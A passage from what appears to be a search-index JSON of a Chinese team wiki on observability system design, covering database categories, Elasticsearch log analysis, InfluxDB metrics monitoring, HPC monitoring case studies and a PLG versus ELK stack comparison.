<li>\u6570\u636e\u5e93\u5b58\u50a8\u9009\u578b\u7ecf\u9a8c\u603b\u7ed3 - \u963f\u91cc\u4e91\u5f00\u53d1\u8005\u793e\u533a</li> <li>\u6570\u636e\u5e93\u5206\u7c7b\u8be6\u89e3\uff1a\u591a\u6837\u5316\u7684\u7c7b\u578b\u4e0e\u5e94\u7528\u573a\u666f - \u6570\u5b57\u7ecf\u6d4e\u89c2\u5bdf\u7f51</li> </ul> <p>\u53ef\u89c2\u6d4b\u6027\u7684\u6bcf\u4e2a\u652f\u67f1\u90fd\u53ef\u4ee5\u6709\u4e00\u5957\u72ec\u7acb\u7684\u7cfb\u7edf\uff0c\u8fd9\u4e9b\u7cfb\u7edf\u7684\u6838\u5fc3\u662f\u6570\u636e\u5e93\uff0c\u4e5f\u662f\u5927\u6570\u636e\u548c\u5206\u6790\u9886\u57df\u7684\u6838\u5fc3\u8bdd\u9898\u3002\u5728\u8bfe\u5185\uff0c\u6211\u4eec\u6700\u591a\u53ea\u63a5\u89e6\u8fc7 MySQL \u8fd9\u6837\u7684\u4f20\u7edf\u5173\u7cfb\u578b\u6570\u636e\u5e93\u3002\u800c\u968f\u7740\u4e92\u8054\u7f51\u3001\u7269\u8054\u7f51\u7b49\u573a\u666f\u53d1\u5c55\uff0c\u6709\u5f88\u591a\u4e1a\u52a1\u9700\u6c42\u4e0d\u662f\u4efb\u4f55\u5355\u4e00\u7684\u6570\u636e\u5e93\u80fd\u89e3\u51b3\u7684\u4e86\u3002\u4e0b\u9762\u5bf9\u5404\u7c7b\u6570\u636e\u5e93\u7684\u7279\u70b9\u505a\u7b80\u5355\u6982\u62ec\uff0c\u4ee5\u5f00\u62d3\u89c6\u91ce\uff1a</p> <ul> <li> <p>\u6309\u662f\u5426\u5173\u7cfb\u578b\u5206\u7c7b\uff1a</p> \u5206\u7c7b \u7279\u70b9 \u5e38\u89c1\u4ea7\u54c1 \u5173\u7cfb\u578b\u6570\u636e\u5e93 - \u6570\u636e\u4ee5\u8868\u683c\u5f62\u5f0f\u5b58\u50a8\uff0c\u6709\u56fa\u5b9a\u6a21\u5f0f- \u4f7f\u7528\u4e3b\u952e\u3001\u5916\u952e\u5efa\u7acb\u5173\u7cfb- \u652f\u6301\u4e8b\u52a1\u5904\u7406\uff0c\u7b26\u5408 ACID \u7279\u6027- \u652f\u6301\u590d\u6742\u67e5\u8be2\u548c\u6570\u636e\u5206\u6790 - Oracle- MySQL- PostgreSQL- Microsoft SQL Server \u975e\u5173\u7cfb\u578b\u6570\u636e\u5e93 - \u4e0d\u4f7f\u7528\u56fa\u5b9a\u6a21\u5f0f\uff0c\u6570\u636e\u4ee5\u952e\u503c\u5bf9\u3001\u6587\u6863\u3001\u5217\u65cf\u7b49\u5f62\u5f0f\u5b58\u50a8- \u652f\u6301\u6c34\u5e73\u6269\u5c55\u548c\u5206\u5e03\u5f0f\u8ba1\u7b97- \u9ad8\u6027\u80fd\u3001\u4f4e\u5ef6\u8fdf - Redis- MongoDB- Cassandra- Neo4j </li> <li> <p>\u6309\u6309\u7279\u5b9a\u573a\u666f\u5206\u7c7b\uff1a</p> \u6570\u636e\u5e93\u7c7b\u578b \u7279\u70b9 \u5e38\u89c1\u4ea7\u54c1 \u952e\u503c\u6570\u636e\u5e93 \u6570\u636e\u4ee5\u952e\u503c\u5bf9\u5f62\u5f0f\u5b58\u50a8\uff0c\u652f\u6301\u9ad8\u6027\u80fd\u8bfb\u5199 Redis, Memcached, Riak \u5217\u5f0f\u6570\u636e\u5e93 \u6570\u636e\u6309\u5217\u5b58\u50a8\uff0c\u9002\u5408\u5927\u89c4\u6a21\u6570\u636e\u5904\u7406 HBase, ClickHouse, Cassandra \u6587\u6863\u6570\u636e\u5e93 \u6570\u636e\u4ee5\u6587\u6863\uff08\u5982 JSON\u3001XML\uff09\u5b58\u50a8\uff0c\u7075\u6d3b\u7684\u6a21\u578b MongoDB, Couchbase \u56fe\u5f62\u6570\u636e\u5e93 \u5904\u7406\u56fe\u7ed3\u6784\u6570\u636e\uff0c\u9002\u7528\u4e8e\u793e\u4ea4\u7f51\u7edc\u3001\u77e5\u8bc6\u56fe\u8c31\u7b49 Neo4j, Amazon Neptune \u65f6\u5e8f\u6570\u636e\u5e93 \u4e13\u7528\u4e8e\u65f6\u95f4\u5e8f\u5217\u6570\u636e\uff0c\u652f\u6301\u9ad8\u6548\u5199\u5165\u548c\u67e5\u8be2 InfluxDB, TimescaleDB \u5411\u91cf\u6570\u636e\u5e93 \u5904\u7406\u9ad8\u7ef4\u5411\u91cf\u6570\u636e\uff0c\u9002\u7528\u4e8e AI \u548c\u63a8\u8350\u7cfb\u7edf Milvus, Faiss \u7a7a\u95f4\u6570\u636e\u5e93 \u5904\u7406\u5730\u7406\u7a7a\u95f4\u6570\u636e\uff0c\u652f\u6301\u5730\u7406\u67e5\u8be2 PostGIS, Oracle Spatial \u641c\u7d22\u5f15\u64ce\u6570\u636e\u5e93 \u4e13\u4e3a\u5168\u6587\u641c\u7d22\u8bbe\u8ba1\uff0c\u652f\u6301\u590d\u6742\u67e5\u8be2 Elasticsearch, Apache Lucene, Apache Solr \u591a\u6a21\u6570\u636e\u5e93 \u652f\u6301\u591a\u79cd\u6570\u636e\u6a21\u578b\uff0c\u63d0\u4f9b\u7075\u6d3b\u7684\u6570\u636e\u5904\u7406 ArangoDB, OrientDB </li> </ul> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u5206\u6790\u4e24\u4e2a\u4f8b\u5b50\uff0c\u4ece\u539f\u7406\u51fa\u53d1\uff0c\u4e86\u89e3\u8fd9\u4e9b\u6570\u636e\u5e93\u7684\u7279\u70b9\u548c\u5e94\u7528\u573a\u666f\u3002</p> <p>\u641c\u7d22\u5f15\u64ce\u6570\u636e\u5e93 Elasticsearch \u4e0e\u65e5\u5fd7\u5206\u6790</p> <p>\u89c2\u770b  Elastic Search\u662f\u4ec0\u4e48\uff1fLucene\u662f\u4ec0\u4e48\uff1f\u67b6\u6784\u662f\u600e\u4e48\u6837\u7684\uff1f- \u5c0f\u767d debug\uff0c\u4e86\u89e3 Elasticsearch \u7684\u539f\u7406\u548c\u67b6\u6784\u3002\u4fee\u8bfb\u8fc7\u300a\u9ad8\u7ea7\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u5206\u6790\u300b\u7684\u540c\u5b66\u5e94\u8be5\u5f88\u5bb9\u6613\u7406\u89e3\u5176\u4e2d\u5012\u6392\u7d22\u5f15\u7684\u6982\u5ff5\u3002</p> <p>Elasticsearch \u5c06\u6570\u636e\u7ec4\u7ec7\u4e3a\u6587\u6863\uff0c\u8fd9\u4e9b\u6587\u6863\u662f\u57fa\u4e8e JSON \u7684\u4fe1\u606f\u5355\u5143\uff0c\u7528\u4e8e\u8868\u793a\u5b9e\u4f53\u3002\u6587\u6863\u6839\u636e\u5176\u7279\u5f81\u88ab\u5f52\u7c7b\u5230\u7d22\u5f15\u4e2d\u3002</p> <p>\u4e3e\u4e00\u4e2a\u5177\u4f53\u7684\u4f8b\u5b50\uff0c\u8fd9\u662f\u4e00\u6761\u5b58\u50a8\u5728 Elasticsearch \u4e2d\u7684\u65e5\u5fd7\u6570\u636e\u3002\u7cfb\u7edf\u4e2d\u5404\u4e2a\u7ec4\u4ef6\u6bcf\u65f6\u6bcf\u523b\u90fd\u5728\u4ea7\u751f\u8fd9\u6837\u7684\u6d77\u91cf\u7684\u65e5\u5fd7\uff1a</p> <pre><code>{\n    \"type\":\"liberty_message\",\n    \"host\":\"9e1eceec70c1\",\n    \"ibm_userDir\":\"\\/opt\\/ol\\/wlp\\/usr\\/\",\n    \"ibm_serverName\":\"defaultServer\",\n    \"message\":\"BADAP0004W: BadApp Angry for test\",\n    \"ibm_threadId\":\"0000009f\",\n    \"ibm_datetime\":\"2020-05-04T12:33:26.064+0000\",\n    \"ibm_messageId\":\"BADAP0004W\",\n    \"module\":\"com.ibm.ws.lumberjack.badness.Angry\",\n    \"loglevel\":\"WARNING\",\n}\n</code></pre> <p>\u8fd0\u7ef4\u4eba\u5458\u5982\u4f55\u5ba1\u8ba1\u8fd9\u4e9b\u65e5\u5fd7\uff1f\u6700\u57fa\u7840\u7684\u64cd\u4f5c\u5c31\u662f\u8fc7\u6ee4\u3002\u6bd4\u5982\uff0c\u5ba1\u8ba1\u7528\u6237\u7684 SSH \u767b\u9646\u884c\u4e3a\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u7b5b\u9009 <code>sshd</code> \u6a21\u5757\u7684\u65e5\u5fd7\uff0c\u5e76\u67e5\u8be2 <code>message</code> \u5b57\u6bb5\u662f\u5426\u5305\u542b <code>Invalid user</code> \u6765\u5b9e\u73b0\u3002</p> <p>\u4f60\u53ef\u80fd\u4f1a\u89c9\u5f97\uff1a\u8fd9\u4e0d\u5c31\u662f\u5173\u7cfb\u578b\u6570\u636e\u5e93\u4e2d\u7684\u4e00\u884c\u6570\u636e\u561b\uff1f\u4f7f\u7528 MySQL \u4e0d\u5c31\u80fd\u89e3\u51b3\u4e86\uff1f\u4e0a\u9762\u7684\u6570\u636e\u592a\u7b80\u5355\u4e86\uff0cJSON \u8fd8\u53ef\u4ee5\u5d4c\u5957\uff0c\u4ece\u5404\u79cd\u5730\u65b9\u6536\u96c6\u7684\u65e5\u5fd7\u4e5f\u5177\u6709\u4e0d\u540c\u7684 schema\u3002\u5982\u679c\u8981\u5728\u5173\u7cfb\u578b\u6570\u636e\u5e93\u4e2d\u5b58\u50a8\u8fd9\u4e9b\u6570\u636e\uff0c\u5c31\u9700\u8981\u8bbe\u8ba1\u5f88\u591a\u8868\u3002\u4e0d\u4ec5\u8bbe\u8ba1\u590d\u6742\uff0c\u6548\u7387\u4e5f\u4f4e\u3002\u800c Elasticsearch \u80fd\u76f4\u63a5\u4ee5\u6587\u6863\u7684\u5f62\u5f0f\u5b58\u50a8\u8fd9\u4e9b\u6570\u636e\uff0c\u5e76\u5efa\u7acb\u7d22\u5f15\uff0c\u65b9\u4fbf\u5feb\u901f\u67e5\u8be2\u3002</p> <p>\u56e0\u4e3a\u641c\u7d22\u5f15\u64ce\u6570\u636e\u5e93\u9ad8\u6548\u5904\u7406\u4e0d\u540c\u683c\u5f0f\u548c\u7c7b\u578b\u7684\u6570\u636e\u3001\u63d0\u4f9b\u7075\u6d3b\u7684\u641c\u7d22\u548c\u68c0\u7d22\u529f\u80fd\u7684\u7279\u70b9\uff0c\u5728\u53ef\u89c2\u6d4b\u6027\u9886\u57df\uff0cElasticsearch \u88ab\u5e7f\u6cdb\u5e94\u7528\u4e8e\u65e5\u5fd7\u5206\u6790\u7b49\u573a\u666f\u3002</p> <p>\u65f6\u5e8f\u6570\u636e\u5e93 InfluxDB \u4e0e\u6307\u6807\u76d1\u63a7</p> <p>\u65f6\u5e8f\u6570\u636e\u5e93\u7684\u9700\u6c42\u6765\u6e90\u4e8e\u6307\u6807\u76d1\u63a7\u573a\u666f\u3002\u76d1\u63a7\u7cfb\u7edf\u9700\u8981\u5b9e\u65f6\u6536\u96c6\u3001\u5b58\u50a8\u3001\u67e5\u8be2\u548c\u5206\u6790\u5927\u91cf\u7684\u65f6\u95f4\u5e8f\u5217\u6570\u636e\uff0c\u6bd4\u5982 CPU \u4f7f\u7528\u7387\u3001\u5185\u5b58\u4f7f\u7528\u7387\u3001\u7f51\u7edc\u6d41\u91cf\u7b49\u3002\u8fd9\u4e9b\u6570\u636e\u901a\u5e38\u4ee5\u65f6\u95f4\u6233\u548c\u503c\u7684\u5f62\u5f0f\u5b58\u50a8\uff0c\u800c\u4e14\u6570\u636e\u91cf\u5de8\u5927\u3002\u6307\u6807\u76d1\u63a7\u9700\u8981\u4e00\u4e2a\u5177\u5907\u4e0b\u5217\u7279\u70b9\u7684\u6570\u636e\u5e93\uff1a</p> <ul> <li>\u6781\u9ad8\u7684\u5199\u541e\u5410\u91cf</li> <li>\u6570\u636e\u9700\u8981\u9ad8\u5ea6\u538b\u7f29</li> <li>\u5927\u8303\u56f4\u626b\u63cf\u8bb0\u5f55</li> <li>\u539f\u751f\u652f\u6301\u805a\u5408\u7b49\u64cd\u4f5c</li> </ul> <p>\u4e0a\u9762\u8fd9\u4e9b\u662f MySQL \u4e0d\u64c5\u957f\u7684\u3002InfluxDB \u9488\u5bf9\u65f6\u5e8f\u6570\u636e\u7684\u7279\u70b9\u5bf9\u5b58\u50a8\u5f15\u64ce\u505a\u4e86\u4e00\u7cfb\u5217\u4f18\u5316\uff0c\u6bd4\u5982\u964d\u4f4e\u4e86\u4e8b\u52a1\u7684\u8981\u6c42\u3001\u4ece LSM \u6f14\u8fdb\u6210 TSM \u4f5c\u4e3a\u5e95\u5c42\u6570\u636e\u7684\u5b58\u50a8\u3002\u8fd9\u6837\u7684\u6539\u53d8\u4f7f\u5f97 InfluxDB \u7684\u67e5\u8be2\u6027\u80fd\u6bd4 MySQL \u5feb 2.5~45 \u500d\uff0c\u6570\u636e\u538b\u7f29\u8d85\u8fc7 4.5 \u500d\uff08\u89c1 Compare InfluxDB vs MySQL\uff09\u3002</p> <p>\u5173\u4e8e InfluxDB \u539f\u7406\uff0c\u53ef\u4ee5\u89c2\u770b InfluxData \u7684 CTO Paul Dix \u5728 2017 \u5e74\u505a\u7684\u5206\u4eab  \u3010InfluxDB\u3011InfluxDB \u5b58\u50a8\u5f15\u64ce\u6280\u672f\u5185\u5e55\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/#\u53ef\u89c2\u6d4b\u6027\u7cfb\u7edf\u8bbe\u8ba1","title":"\u53ef\u89c2\u6d4b\u6027\u7cfb\u7edf\u8bbe\u8ba1","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/observability/#\u9700\u6c42\u5206\u6790","title":"\u9700\u6c42\u5206\u6790","text":"<p>\u5728\u5bf9\u53ef\u89c2\u6d4b\u6027\u6709\u4e86\u4e00\u4e9b\u57fa\u672c\u7684\u4e86\u89e3\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f00\u59cb\u8bc4\u4f30\u81ea\u5df1\u7684\u9700\u6c42\uff0c\u8bbe\u8ba1\u4e00\u5957\u7cfb\u7edf\u4e86\u3002\u4e0a\u8ff0\u7684\u4e09\u5927\u652f\u67f1\u4e2d\uff0c\u6211\u4eec\u6682\u65f6\u4e0d\u4f1a\u7528\u5230 trace\uff08\u540e\u7eed\u5bf9 mirror \u8fd9\u6837\u7684\u670d\u52a1\u5185\u90e8\u8fdb\u884c\u9065\u6d4b\u65f6\u53ef\u80fd\u4f1a\u4f7f\u7528\uff09\uff0c\u6240\u4ee5\u76ee\u524d\u4ec5\u8003\u8651\u4e24\u4e2a\u65b9\u9762\uff1a\u65e5\u5fd7\u5206\u6790\u548c\u6307\u6807\u76d1\u63a7\u3002</p> <p>\u8bbe\u8ba1\u89c2\u6d4b\u9700\u6c42\u65f6\uff0c\u5e94\u5f53\u8003\u8651\u771f\u6b63\u611f\u5174\u8da3\u7684\u56e0\u7d20\uff0c\u800c\u4e0d\u662f\u6709\u4ec0\u4e48\u5c31\u89c2\u6d4b\u4ec0\u4e48\uff0c\u6ca1\u6709\u4eba\u4f1a\u6574\u5929\u5750\u5728\u76d1\u63a7\u5927\u5c4f\u524d\u6d4f\u89c8\u6307\u6807\u548c\u65e5\u5fd7\u3002\u6211\u4eec\u8bbe\u8ba1\u7684\u9700\u6c42\u5e94\u5f53\u80fd\u591f\u7531\u89c2\u6d4b\u7cfb\u7edf\u4e3b\u52a8\u54cd\u5e94\u6765\u6ee1\u8db3\u3002</p> <p>\u6211\u4eec\u9700\u8981\u8003\u8651\u7684\u56e0\u7d20\u6709\uff1a</p> <ul> <li>\u7528\u4f8b\uff1a\u4f60\u80fd\u591f\u5b9a\u4e49\u7cbe\u786e\u7684\u573a\u666f\uff0c\u8bf4\u660e\u7cfb\u7edf\u662f\u5982\u4f55\u4f7f\u7528\u7684\u5417\uff1f\u4f8b\u5982\uff1a\u4f5c\u4e3a\u7cfb\u7edf\u7684\u7528\u6237\uff0c\u6211\u60f3\u8981\u8fd0\u884c\u4e00\u4e2a\u62a5\u544a\uff0c\u544a\u8bc9\u6211\u8fc7\u53bb 24 \u5c0f\u65f6 Windows \u670d\u52a1\u5668\u4e0a\u7684\u767b\u9646\u5931\u8d25\u6b21\u6570\u3002</li> <li>\u9a71\u52a8\u56e0\u7d20\uff1a\u662f\u4ec0\u4e48\u201c\u9a71\u52a8\u201d\u4f60\u542f\u52a8\u8fd9\u4e00\u9879\u76ee\uff1f\u662f\u56e0\u4e3a\u6709\u8da3\u3001\u5fc5\u8981\u6027\u8fd8\u662f\u653f\u5e9c\u6cd5\u89c4\u6216\u8005\u5176\u4ed6\u76ee\u7684\uff1f\u5982\u679c\u4f60\u80fd\u591f\u56de\u7b54\u8fd9\u4e2a\u95ee\u9898\uff0c\u5c31\u80fd\u4e3a\u9a71\u52a8\u56e0\u7d20\u6307\u5b9a\u4e00\u4e2a\u4f18\u5148\u7ea7\uff0c\u8fd9\u6709\u52a9\u4e8e\u4f60\u6e05\u6670\u5730\u4e86\u89e3\u4e3a\u6b64\u5206\u914d\u7684\u65f6\u95f4\u548c\u8d44\u6e90\u3002</li> <li>\u89e3\u51b3\u7684\u95ee\u9898\uff1a\u90e8\u7f72\u4e00\u4e2a\u53ef\u89c2\u6d4b\u6027\u7cfb\u7edf\u80fd\u5e2e\u52a9\u4f60\u89e3\u51b3\u5176\u4ed6\u95ee\u9898\u5417\uff1f\u4f8b\u5982\uff0c\u7531\u4e8e\u4f60\u6536\u96c6\u7684\u4fe1\u606f\u7c7b\u578b\uff0c\u53ef\u89c2\u6d4b\u6027\u7cfb\u7edf\u80fd\u591f\u5e2e\u52a9\u4f60\u8fdb\u884c\u670d\u52a1\u5668\u548c\u7f51\u7edc\u76d1\u63a7\u3002</li> </ul> \u9700\u6c42 \u9700\u8981\u89c2\u6d4b\u7684\u6570\u636e \u6211\u60f3\u77e5\u9053\u8fdb\u884c\u7684\u64cd\u4f5c\u662f\u5426\u5f71\u54cd\u4e86\u7cfb\u7edf\u8fd0\u884c\uff0c\u53ef\u80fd\u662f\u54ea\u4e9b\u64cd\u4f5c\u9020\u6210\u7684 \u5ba1\u8ba1\u65e5\u5fd7\uff08root \u6743\u9650\u6267\u884c\u7684\u64cd\u4f5c\uff09 \u6211\u60f3\u77e5\u9053\u7cfb\u7edf\u7684\u72b6\u6001\u662f\u5426\u53d1\u751f\u4e86\u6539\u53d8\uff0c\u662f\u4ec0\u4e48\u9020\u6210\u7684 \u5185\u6838\u65e5\u5fd7\uff0c\u786c\u4ef6\u65e5\u5fd7\uff0c\u7cfb\u7edf\u6307\u6807 \u6211\u60f3\u77e5\u9053\u7cfb\u7edf\u4e2d\u662f\u5426\u6709\u5f02\u5e38\u7684\u7a0b\u5e8f\uff0c\u5b83\u9020\u6210\u6301\u7eed\u7684\u9ad8\u5360\u7528\uff0c\u6216\u4e0d\u65ad\u4ea7\u751f\u9519\u8bef \u8fdb\u7a0b\u7684\u8d44\u6e90\u5229\u7528\u7387 \u6211\u60f3\u77e5\u9053\u54ea\u4e9b\u662f\u6076\u610f IP IP \u5730\u5740\u7684\u8bf7\u6c42\u91cf\u3001\u54cd\u5e94\u60c5\u51b5\u3001\u6d88\u8017\u5e26\u5bbd\u3001\u5730\u7406\u4f4d\u7f6e \u6211\u60f3\u77e5\u9053\u54ea\u4e9b\u955c\u50cf\u7684\u4f7f\u7528\u7387\u6700\u9ad8 \u6587\u4ef6\u8bbf\u95ee\u6b21\u6570\uff0c\u6309\u955c\u50cf\u805a\u5408 \u6211\u60f3\u77e5\u9053\u955c\u50cf\u7684\u540c\u6b65\u60c5\u51b5 MirrorDotNet \u540c\u6b65\u4efb\u52a1\u961f\u5217\u3001\u4efb\u52a1\u8fd0\u884c\u65f6\u95f4\u662f\u5426\u5f02\u5e38 \u6211\u60f3\u77e5\u9053\u662f\u5426\u6709\u4eba\u5728\u5c1d\u8bd5\u53d1\u8d77\u653b\u51fb \u6301\u7eed\u5931\u8d25\u7684 SSH \u8bf7\u6c42\uff0c\u7aef\u53e3\u626b\u63cf <p>\u5728\u521d\u6b65\u7814\u8ba8\u540e\uff0c\u6211\u4eec\u5f97\u51fa\u4e86\u4ee5\u4e0b\u9700\u6c42\uff0c\u5e76\u68b3\u7406\u4e86\u76f8\u5173\u6570\u636e\u6e90\uff1a</p> \u7cfb\u7edf \u9700\u6c42 \u6570\u636e\u6e90\u53ca\u5176\u91c7\u96c6\u65b9\u5f0f \u6307\u6807\u76d1\u63a7 - \u76d1\u63a7\u7cfb\u7edf\u8d44\u6e90\u5229\u7528\u7387\u548c\u8fd0\u884c\u72b6\u51b5- \u4e3a HPC \u6027\u80fd\u8c03\u4f18\u63d0\u4f9b\u53c2\u8003 - \u8282\u70b9\uff1ametric exporter- \u57fa\u7840\u8bbe\u65bd\uff1aSNMP \u548c RedFish \u65e5\u5fd7\u5206\u6790 - \u76d1\u63a7\u7cfb\u7edf\u5404\u7ec4\u4ef6\u5f02\u5e38\u4e8b\u4ef6- \u89c2\u6d4b\u65e0\u76d8\u7cfb\u7edf\u7684\u670d\u52a1\u7a33\u5b9a\u6027- \u5185\u5916\u90e8\u4e8b\u4ef6\u76d1\u63a7\u548c\u54cd\u5e94\uff08\u8282\u70b9 down\u3001\u65ad\u7535\u65ad\u7f51\u6216\u6ce2\u52a8\u7b49\uff09- \u5165\u4fb5\u9632\u5fa1\u3001\u884c\u4e3a\u5206\u6790\uff08\u6765\u81ea mirror\uff09 - \u7cfb\u7edf\u65e5\u5fd7- \u5404\u7c7b\u670d\u52a1\u548c\u5e94\u7528\uff1a\u65e5\u5fd7\u6587\u4ef6\u548c systemd-journal- \u57fa\u7840\u8bbe\u65bd\uff1asyslog \u548c SNMP Trap","tags":["\u5b8c\u5584"]},{"location":"operation/observability/#\u6280\u672f\u9009\u578b\u4e0e\u6848\u4f8b\u8c03\u7814","title":"\u6280\u672f\u9009\u578b\u4e0e\u6848\u4f8b\u8c03\u7814","text":"<p>\u5728\u6784\u5efa\u7cfb\u7edf\u65f6\uff0c\u4f1a\u9762\u4e34\u6280\u672f\u9009\u578b\u4e0a\u7684\u96be\u9898\uff1a\u4e1c\u897f\u592a\u591a\u4e86\u3002\u4e0b\u9762\u7684\u56fe\u7247\u6765\u81ea Cloud Native Landscape\uff0c\u663e\u793a\u4e86\u53ef\u89c2\u6d4b\u6027\u9886\u57df\u6709\u591a\u5c11\u4f18\u79c0\u7684\u4ea7\u54c1\u53ef\u4f9b\u9009\u62e9\u3002</p> Cloud Native Landscape <p>\u6211\u4eec\u6ca1\u6709\u4ec0\u4e48\u5b9e\u9645\u7ecf\u9a8c\uff0c\u56e0\u6b64\u53ef\u4ee5\u5148\u505a\u4e00\u4e9b\u6848\u4f8b\u8c03\u7814\uff0c\u4e86\u89e3\u4e1a\u754c\u4e3b\u6d41\u65b9\u5411\uff0c\u7136\u540e\u518d\u6839\u636e\u81ea\u5df1\u7684\u9700\u6c42\u548c\u6280\u672f\u6808\u6765\u9009\u62e9\u5408\u9002\u7684\u65b9\u6848\u3002\u6211\u4eec\u4f1a\u53c2\u8003\u7684\u5305\u62ec HPC \u9886\u57df\u8bba\u6587\u548c\u4e92\u8054\u7f51\u5927\u5382\u7684\u6280\u672f\u535a\u5ba2\uff0c\u4ee5\u53ca\u6765\u81ea\u5f00\u6e90\u793e\u533a\u7684\u5b9e\u8df5\u7ecf\u9a8c\u3002</p> \u6848\u4f8b\u8c03\u7814 <p>\u4e0b\u9762\u662f\u6211\u4eec\u770b\u8fc7\u4e00\u4e9b\u6848\u4f8b\uff0c\u6709\u5174\u8da3\u4e86\u89e3\u7684\u540c\u5b66\u53ef\u4ee5\u770b\u770b\uff1a</p> <ul> <li>2019 High Performance Computing Monitoring. (Conference) | OSTI.GOV\uff1a\u7f8e\u56fd\u6851\u8fea\u4e9a\uff08Sandia\uff09\u56fd\u5bb6\u5b9e\u9a8c\u5ba4\u505a\u4e86\u4e00\u5957\u5f00\u6e90\u7684 HPC \u76d1\u63a7\u7cfb\u7edf  OVIS/LDMS\u3002\u4ed6\u4eec\u7684\u8bbe\u8ba1\u4e86\u8282\u70b9\u7684\u6307\u6807\u91c7\u96c6\u3001\u7ba1\u7406\u8282\u70b9\u4e0a\u7684\u4e24\u5c42\u6570\u636e\u805a\u5408\uff0c\u6700\u540e\u4f7f\u7528 Splunk \u8fdb\u884c\u6570\u636e\u5206\u6790\u3002</li> <li>2021 Enhancing observability for High Performance Computing infrastructure with Grafana\uff1a\u7f8e\u56fd\u8d85\u7b97\u5e94\u7528\u56fd\u5bb6\u4e2d\u5fc3\uff08NCSA\uff09\u4f7f\u7528 Grafana \u5bf9 HPC \u7cfb\u7edf\u8fdb\u884c\u53ef\u89c2\u6d4b\u6027\u589e\u5f3a\uff0c\u6bd4\u5982\u8fdb\u884c Job \u6570\u636e\u7684\u53ef\u89c6\u5316\u76d1\u63a7\u7b49\u3002\u4ed6\u4eec\u4f7f\u7528 Telegraf \u91c7\u96c6\u6307\u6807\u6570\u636e\uff0c\u5b58\u50a8\u5230 InfluxDB\u3002\u4ed6\u4eec\u8ba1\u5212\u5c06 Elasticsearch \u4f5c\u4e3a Grafana Log \u770b\u677f\u540e\u7aef\u3002</li> <li>2023 HPC Monitoring &amp; Visualization: Understanding usage of HPC systems - PEARC'23\uff1a\u7f8e\u56fd\u592a\u5e73\u6d0b\u897f\u5317\u56fd\u5bb6\u5b9e\u9a8c\u5ba4\u5c55\u793a\u4e86\u4ed6\u4eec\u57fa\u4e8e Prometheus \u548c Grafana \u7684 HPC \u76d1\u63a7\u7cfb\u7edf\u3002</li> <li>2024 SOMA: Observability, Monitoring, and In Situ Analytics in Exascale Applications\uff1a\u57fa\u4e8e\u5fae\u670d\u52a1\u67b6\u6784\u7684 HPC \u53ef\u89c2\u6d4b\u6027\u7cfb\u7edf\u3002\u6587\u7ae0\u4f5c\u8005\u6765\u81ea\u4fc4\u52d2\u5188\u5927\u5b66\u3001NVIDIA\u3001\u5e03\u9c81\u514b\u6d77\u6587\u56fd\u5bb6\u5b9e\u9a8c\u5ba4\u3001\u7f57\u683c\u65af\u5927\u5b66\u3002\u4fc4\u52d2\u5188\u5927\u5b66\u5f00\u53d1\u4e86\u77e5\u540d\u7684 HPC \u6027\u80fd\u5206\u6790\u5de5\u5177 TAU\u3002</li> <li>Bilibili \u6280\u672f\u56e2\u961f\u7684\u516c\u4f17\u53f7\u6587\u7ae0\uff1a<ul> <li>\u6301\u7eed\u964d\u672c\uff1aB \u7ad9\u65e5\u5fd7\u5e73\u53f0 3.0 \u6f14\u8fdb\u4e4b\u8def</li> <li>B \u7ad9\u57fa\u4e8e Clickhouse \u7684\u4e0b\u4e00\u4ee3\u65e5\u5fd7\u4f53\u7cfb\u5efa\u8bbe\u5b9e\u8df5</li> <li>\u4ece ES \u5230 ClickHouse\uff1aB \u7ad9\u6d77\u91cf\u65e5\u5fd7\u5206\u6790\u573a\u666f\u8fc1\u79fb\u7684\u5b9e\u8df5\u4e0e\u601d\u8003</li> <li>billions 3.0 \u65e5\u5fd7\u5e73\u53f0\u4e3b\u8981\u4f7f\u7528 iceberg + clickhouse \u7684\u6df7\u5408\u5b58\u50a8\u3002</li> </ul> </li> </ul> <p>\u603b\u800c\u8a00\u4e4b\u6211\u4eec\u7684\u6280\u672f\u9009\u578b\u5982\u56fe\u6240\u793a\uff0c\u4e0b\u6587\u5c06\u8be6\u7ec6\u4ecb\u7ecd\u6bcf\u4e2a\u90e8\u5206\u7684\u6280\u672f\u6808\u3002</p> \u53ef\u89c2\u6d4b\u6027\u7cfb\u7edf\u8bbe\u8ba1","tags":["\u5b8c\u5584"]},{"location":"operation/observability/#\u6210\u719f\u65b9\u6848plg-\u548c-elk","title":"\u6210\u719f\u65b9\u6848\uff1aPLG \u548c ELK","text":"<p>\u76ee\u524d\u4e1a\u754c\u4e3b\u6d41\u7684\u53ef\u89c2\u6d4b\u6027\u7cfb\u7edf\u6709\uff1a</p> <ul> <li>PLG Stack: Promtail/Prometheus, Loki, Grafana</li> <li>ELK Stack: Elasticsearch, Logstash, Kibana</li> </ul> <p>\u7b80\u5355\u4e86\u89e3\u4e00\u4e0b\u8fd9\u4e9b\u53ef\u89c2\u6d4b\u6027\u7cfb\u7edf\uff0c\u5c31\u4f1a\u53d1\u73b0\u5b83\u4eec\u7684\u67b6\u6784\u57fa\u672c\u4e00\u81f4\uff0c\u90fd\u662f\u7531\u6570\u636e\u6536\u96c6\u3001\u6570\u636e\u5b58\u50a8\u3001\u6570\u636e\u67e5\u8be2\u3001\u6570\u636e\u5c55\u793a\u56db\u4e2a\u90e8\u5206\u7ec4\u6210\uff0c\u53ea\u662f\u5728\u5b9e\u73b0\u4e0a\u6709\u6240\u53d6\u820d\u3002PLG \u7684\u6838\u5fc3\u662f Grafana\uff0c\u662f\u4e00\u4e2a\u5206\u6790\u548c\u53ef\u89c6\u5316\u5e73\u53f0\uff0c\u66f4\u9002\u5408\u6307\u6807\u76d1\u63a7\uff1bELK \u7684\u6838\u5fc3\u662f Elasticsearch\uff0c\u662f\u4e00\u4e2a\u5168\u6587\u672c\u641c\u7d22\u5f15\u64ce\uff0c\u66f4\u9002\u5408\u65e5\u5fd7\u5206\u6790\u3002</p> <p></p> <p></p> PLG Stack vs. ELK Stack <p>\u5173\u4e8e\u4e24\u8005\u66f4\u8be6\u7ec6\u7684\u5bf9\u6bd4\uff0c\u53ef\u4ee5\u53c2\u8003\u8fd9\u7bc7 2023 \u5e74\u7684\u5b66\u58eb\u5b66\u4f4d\u8bba\u6587\uff1a A Comparative Analysis of Log Management Solutions: ELK Stack 